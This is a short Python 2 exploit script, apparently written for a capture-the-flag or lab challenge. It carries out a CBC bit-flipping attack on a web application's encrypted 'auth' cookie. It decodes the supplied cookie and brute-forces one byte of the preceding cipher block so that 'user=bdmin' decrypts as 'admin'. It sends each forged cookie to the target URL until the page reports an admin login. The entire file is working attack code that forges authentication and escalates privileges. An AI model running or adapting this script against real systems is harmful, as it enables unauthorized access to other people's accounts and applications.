#! /usr/bin/python2
import base64
import urllib
import requests
import sys

url = sys.argv[1]
cookie = sys.argv[2] #????????user=bdmin\x06\x06\x06\x06\x06\x06
length = 8

#convert cookie
cookie = urllib.unquote_plus(cookie)
cookie = base64.b64decode(cookie)
temp = []
for c in cookie:
    temp.append((hex(ord(c))))
cookie = temp

index_to_modify = 13 - length #'b' is at 13 (5 in its "chunk") but we will modify 5th character in previous "chunk"
expected = "You are currently logged in as admin"

for value in range(0, 256):
    cookie[index_to_modify] = hex(value)
    new_cookie = []
    for c in cookie:
        new_cookie.append(chr(int(c, 16)))
    new_cookie = urllib.quote_plus(base64.b64encode("".join(new_cookie)))
    r = requests.get(url, cookies={"auth": new_cookie})
    if expected in r.text:
        print new_cookie
        break

